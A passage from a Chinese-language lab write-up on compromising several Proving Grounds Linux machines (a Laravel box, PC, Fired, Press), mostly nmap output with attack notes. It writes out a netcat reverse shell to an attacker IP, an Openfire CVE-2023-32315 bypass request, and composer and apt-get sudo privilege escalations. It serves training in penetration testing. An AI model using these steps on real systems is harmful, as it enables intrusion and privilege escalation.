OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   3.03 ms 192.168.45.1
2   3.03 ms 192.168.45.254
3   3.10 ms 192.168.251.1
4   3.26 ms 192.168.216.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
```

80运行了http服务，先对目录进行扫描

![image-20250224090839332](./PG_linux.assets/image-20250224090839332.png)

扫描到了login，常规弱口登录失败，注册一个新账号admin/admin123登录系统

![image-20250224091601499](./PG_linux.assets/image-20250224091601499.png)

翻了翻实在没找到框架名称，web只开放了80端口，看了下hints，利用的是 CVE-2021-3129，web框架为Laravel

> 当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

打开debug模式

![image-20250224093540726](./PG_linux.assets/image-20250224093540726.png)

```
python3 exp.py http://192.168.216.38/
```

![image-20250224094734002](./PG_linux.assets/image-20250224094734002.png)

成功执行id命令，修改脚本并执行反弹shell命令，只保留一条可利用链，避免冗余

![image-20250224100155769](./PG_linux.assets/image-20250224100155769.png)

![image-20250224100123521](./PG_linux.assets/image-20250224100123521.png)

上传linpeas.sh并运行，找到了数据库账号密码：lavita/sdfquelw0kly9jgbx92

![image-20250224102902842](./PG_linux.assets/image-20250224102902842.png)

```
mysql -hlocalhost -ulavita -psdfquelw0kly9jgbx92
```

![image-20250224104156183](./PG_linux.assets/image-20250224104156183.png)

成功连接，在user表找到admin用户的账号密码

![image-20250224104312304](./PG_linux.assets/image-20250224104312304.png)

这个是我们刚刚注册的用户，应该不是入口点，上传pspy32s查看进程；发现网站目录下有一个命令一直在运行：`/usr/bin/php /var/www/html/lavita/artisan clear:pictures`

![image-20250224104637207](./PG_linux.assets/image-20250224104637207.png)

修改artisan文件，第一次直接写入了shell命令，没注意是php运行的......

```
echo "<?php system('nc -c sh 192.168.45.184 3001'); ?>">artisan
```

![image-20250224105957873](./PG_linux.assets/image-20250224105957873.png)

成功收到skunk的shell

![image-20250224110017338](./PG_linux.assets/image-20250224110017338.png)

拿到local

![image-20250224110058213](./PG_linux.assets/image-20250224110058213.png)

信息收集发现`sudo -l`有无密码可执行命令`/usr/bin/composer`

![image-20250224110136431](./PG_linux.assets/image-20250224110136431.png)

执行下面命令，注意skunk用户无法写入composer.json，需要用www-data用户执行第一个

```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >/var/www/html/lavita/composer.json
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

![image-20250224111139014](./PG_linux.assets/image-20250224111139014.png)

![image-20250224111245599](./PG_linux.assets/image-20250224111245599.png)

成功提权root，拿到proof

![image-20250224111408061](./PG_linux.assets/image-20250224111408061.png)



## PC

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.210
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-24 18:01 CST
Nmap scan report for 192.168.216.210
Host is up (0.0039s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|     <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>404</h1></body></html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 677047
|     <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>ttyd - Terminal</title><link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb
|   Socks5, X11Probe: 
|     HTTP/1.0 403 Forbidden
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|_    <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>403</h1></body></html>
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=2/24%Time=67BC4374%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2AC0,"HTTP/1\.0\x20200\x20OK\r\nserver:\x20ttyd/1\.7\.3-a2312c
SF:b\x20\(libwebsockets/3\.2\.0\)\r\ncontent-type:\x20text/html\r\ncontent
SF:-length:\x20677047\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head>
SF:<meta\x20charset=\"UTF-8\"><meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=edge,chrome=1\"><title>ttyd\x20-\x20Terminal</title><link\x
SF:20rel=\"icon\"\x20type=\"image/png\"\x20href=\"data:image/png;base64,iV
SF:BORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZ
SF:SBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tl
SF:dCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8\+IDx4OnhtcG
SF:1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlI
SF:DUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJk
SF:ZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW5
SF:0YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Im
SF:h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb
SF:")%r(X11Probe,127,"HTTP/1\.0\x20403\x20Forbidden\r\nserver:\x20ttyd/1\.
SF:7\.3-a2312cb\x20\(libwebsockets/3\.2\.0\)\r\ncontent-type:\x20text/html
SF:\r\ncontent-length:\x20173\r\n\r\n<html><head><meta\x20charset=utf-8\x2
SF:0http-equiv=\"Content-Language\"\x20content=\"en\"/><link\x20rel=\"styl
SF:esheet\"\x20type=\"text/css\"\x20href=\"/error\.css\"/></head><body><h1
SF:>403</h1></body></html>")%r(FourOhFourRequest,127,"HTTP/1\.0\x20404\x20
SF:Not\x20Found\r\nserver:\x20ttyd/1\.7\.3-a2312cb\x20\(libwebsockets/3\.2
SF:\.0\)\r\ncontent-type:\x20text/html\r\ncontent-length:\x20173\r\n\r\n<h
SF:tml><head><meta\x20charset=utf-8\x20http-equiv=\"Content-Language\"\x20
SF:content=\"en\"/><link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20hre
SF:f=\"/error\.css\"/></head><body><h1>404</h1></body></html>")%r(Socks5,1
SF:27,"HTTP/1\.0\x20403\x20Forbidden\r\nserver:\x20ttyd/1\.7\.3-a2312cb\x2
SF:0\(libwebsockets/3\.2\.0\)\r\ncontent-type:\x20text/html\r\ncontent-len
SF:gth:\x20173\r\n\r\n<html><head><meta\x20charset=utf-8\x20http-equiv=\"C
SF:ontent-Language\"\x20content=\"en\"/><link\x20rel=\"stylesheet\"\x20typ
SF:e=\"text/css\"\x20href=\"/error\.css\"/></head><body><h1>403</h1></body
SF:></html>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/24%OT=22%CT=1%CU=42269%PV=Y%DS=4%DC=T%G=Y%TM=67BC438
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   3.35 ms 192.168.45.1
2   3.34 ms 192.168.45.254
3   3.70 ms 192.168.251.1
4   9.58 ms 192.168.216.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.43 seconds
```

开放了8000的http服务，是一个shell终端，直接可以RCE

![image-20250224180529462](./PG_linux.assets/image-20250224180529462.png)

上传linpeas.sh发现在65432端口有运行tcp服务，

![image-20250224183813487](./PG_linux.assets/image-20250224183813487.png)

而且pspy32s也发现root身份运行了rpc.py，可能就是65432端口运行的服务

![image-20250224184026111](./PG_linux.assets/image-20250224184026111.png)

上传iox进行端口转发

```
iox端口转发（将靶机65432转发到攻击机3333）：
攻击机运行
./iox fwd -l *2222 -l 3333 -k 123456
靶机运行(192.168.45.184是攻击机IP)
./iox fwd -r 127.0.0.1:65432 -r *192.168.45.184:2222 -k 123456
```

nmap扫描转发出来的端口

![image-20250224190905691](./PG_linux.assets/image-20250224190905691.png)

没看到什么有用的东西，联想到之前的rpc.py，检索漏洞

![image-20250224191152616](./PG_linux.assets/image-20250224191152616.png)

利用漏洞`rpc.py 0.6.0 RCE`，修改脚本的目标和执行命令

![image-20250224194442109](./PG_linux.assets/image-20250224194442109.png)

拿到root的shell

![image-20250224194356679](./PG_linux.assets/image-20250224194356679.png)

拿到proof

![image-20250224194556214](./PG_linux.assets/image-20250224194556214.png)

## Fired

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.96
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-24 20:13 CST
Nmap scan report for 192.168.216.96
Host is up (0.0029s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 24 Feb 2025 12:14:56 GMT
|     Last-Modified: Tue, 02 Aug 2022 12:04:43 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 24 Feb 2025 12:15:01 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 24 Feb 2025 12:15:12 GMT
|     Last-Modified: Tue, 02 Aug 2022 12:04:43 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 24 Feb 2025 12:15:12 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Not valid before: 2024-06-28T07:02:39
|_Not valid after:  2029-06-27T07:02:39
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.80%I=7%D=2/24%Time=67BC62C0%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2024\x20Feb\x202
SF:025\x2012:14:56\x20GMT\r\nLast-Modified:\x20Tue,\x2002\x20Aug\x202022\x
SF:2012:04:43\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<me
SF:ta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\
SF:n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C
SF:3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illega
SF:l\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x2
SF:0400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPO
SF:ptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2024\x20Feb\x202025
SF:\x2012:15:01\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.80%T=SSL%I=7%D=2/24%Time=67BC62D0%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2024\x20Fe
SF:b\x202025\x2012:15:12\x20GMT\r\nLast-Modified:\x20Tue,\x2002\x20Aug\x20
SF:2022\x2012:04:43\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title
SF:>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</
SF:head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Mon,\x2024\x20Feb\x202025\x2012:15:12\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x205
SF:05\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.39 - 3.2 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   1.92 ms 192.168.45.1
2   1.93 ms 192.168.45.254
3   2.65 ms 192.168.251.1
4   2.99 ms 192.168.216.96

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.23 seconds
```

开放了9090http和9091https服务，经过访问9091就是9090反向代理https服务，并且找到版本号`Openfire, Version: 4.7.3`

![image-20250224201814823](./PG_linux.assets/image-20250224201814823.png)

搜索版本信息发现一篇漏洞复现文章：https://www.cnblogs.com/fuchangjiang/p/17713984.html

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=admin123&name=&email=&password=admin123&passwordConfirm=admin123&isadmin=on&create=Create+User HTTP/1.1
Host: 192.168.216.96:9090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Cookie: csrf=csrftoken
```

发送数据包添加用户密码：admin123/admin123

![image-20250224202556630](./PG_linux.assets/image-20250224202556630.png)

有个坑就是登录不进入，debug发现是index.jsp访问一直转圈，登录后会跳转到index.jsp，我这里直接通过数据包登录拿到cookie添加到浏览器，然后直接访问`user-summary.jsp`就出来东西了

![image-20250224205627925](./PG_linux.assets/image-20250224205627925.png)

上传插件：https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass

![image-20250224210910451](./PG_linux.assets/image-20250224210910451.png)

然后访问/profile-settings.jsp，点击（因为我点击最上面server没反应，有bug一直转圈

![image-20250225091247004](./PG_linux.assets/image-20250225091247004.png)

使用密码：123进入shell，成功RCE

![image-20250225091150907](./PG_linux.assets/image-20250225091150907.png)

成功拿到shell（反弹shell命令一个不行就一个一个试，玄学

![image-20250225091552729](./PG_linux.assets/image-20250225091552729.png)

拿到local

![image-20250225091703249](./PG_linux.assets/image-20250225091703249.png)

suid等常规信息收集无果，尝试上传iox搭建隧道看看这些端口服务

![image-20250225094153288](./PG_linux.assets/image-20250225094153288.png)

然而并没发现突破点，还试了一下PwnKit（CVE-2021-4034）也不行，看了hints，

> 别忘了翻一翻网站数据库！

进入网站目录`/var/lib/openfire/`

![image-20250225102206595](./PG_linux.assets/image-20250225102206595.png)

有log和script文件

![image-20250225102322035](./PG_linux.assets/image-20250225102322035.png)

log是我刚刚的登录网站的凭证信息等等，在script找到了icmp的凭证

![image-20250225102621517](./PG_linux.assets/image-20250225102621517.png)

尝试用该密码：OpenFireAtEveryone，切换root身份成功，拿到proof

![image-20250225102659736](./PG_linux.assets/image-20250225102659736.png)

## Press

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.29
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 10:29 CST
Nmap scan report for 192.168.216.29
Host is up (0.0027s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Lugx Gaming Shop HTML5 Template
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: FlatPress
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/25%OT=22%CT=1%CU=30209%PV=Y%DS=4%DC=T%G=Y%TM=67BD2B2
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   2.21 ms 192.168.45.1
2   2.21 ms 192.168.45.254
3   2.50 ms 192.168.251.1
4   2.73 ms 192.168.216.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.73 seconds
```

开放了80和8089的http服务

![image-20250225123411950](./PG_linux.assets/image-20250225123411950.png)

FlatPress框架试了一些弱口令都登录失败了，然后耗费3小时试了很多漏洞，最后看了下hints，没想到密码是`password`，，，，

使用admin/password成功登录系统，那就可以用exp了

![image-20250225181413083](./PG_linux.assets/image-20250225181413083.png)

上传shell后访问即可，php前面貌似得加上`GIT89a`，不然没法上传

![image-20250225183027329](./PG_linux.assets/image-20250225183027329.png)

成功RCE

![image-20250225182932367](./PG_linux.assets/image-20250225182932367.png)

反弹shell

![image-20250225183303190](./PG_linux.assets/image-20250225183303190.png)

常规信息收集发现可以无密码sudo执行apt-get

![image-20250225183402476](./PG_linux.assets/image-20250225183402476.png)

常规sudo提权：https://gtfobins.github.io/gtfobins/apt-get/#sudo

```
sudo apt-get changelog apt
!/bin/sh
```

![image-20250225183514523](./PG_linux.assets/image-20250225183514523.png)

拿到proof

![image-20250225183557847](./PG_linux.assets/image-20250225183557847.png)

## Scrutiny

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.91
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 18:38 CST
Nmap scan report for 192.168.216.91
Host is up (0.0034s latency).
Not shown: 65531 filtered ports
